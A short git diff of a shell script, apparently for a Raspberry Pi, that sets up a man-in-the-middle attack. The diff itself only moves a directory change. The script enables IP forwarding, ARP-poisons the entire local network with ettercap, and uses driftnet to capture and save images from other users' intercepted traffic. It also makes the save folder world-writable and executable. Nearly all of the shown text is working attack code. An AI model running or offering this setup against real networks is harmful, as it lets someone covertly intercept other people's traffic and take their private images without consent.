@@ -4,10 +4,10 @@ echo "$(tput bold)$(tput setaf 1)MITM initialize & enable port forwarding & make
 # create directory to save images on external HDD on Pi because
 # me no like SD card limitied write cycles :'(
 sudo mkdir /mnt/localImages
+cd /mnt/localImages/ #enter directory of images
 gif=$(find /mnt/localImages/ -type f -name "*.gif")
 sudo chmod -R a+rwx /mnt/localImages # enable all read/write/execute permissions for to HDD
 sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for ARP poisoning
-cd /mnt/localImages/ #enter directory of images
 sudo ettercap -T -Q -M arp -i eth0 // // &
 echo "$(tput bold)$(tput setaf 1)extract images & save$(tput sgr0)"
 sudo driftnet -v -i eth0 -a -m 100 -d /mnt/localImages -x myImages & # save 100 images
